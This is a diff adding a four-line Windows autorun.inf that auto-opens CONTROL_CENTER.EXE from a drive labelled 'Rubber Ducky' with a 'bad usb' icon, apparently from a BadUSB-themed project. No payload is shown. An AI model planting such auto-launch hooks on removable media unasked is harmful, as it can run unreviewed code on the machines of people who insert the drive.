@@ -1,0 +1,4 @@
+[AutoRun]
+OPEN=CONTROL_CENTER.EXE
+ICON=bad usb.ico
+LABEL=Rubber Ducky
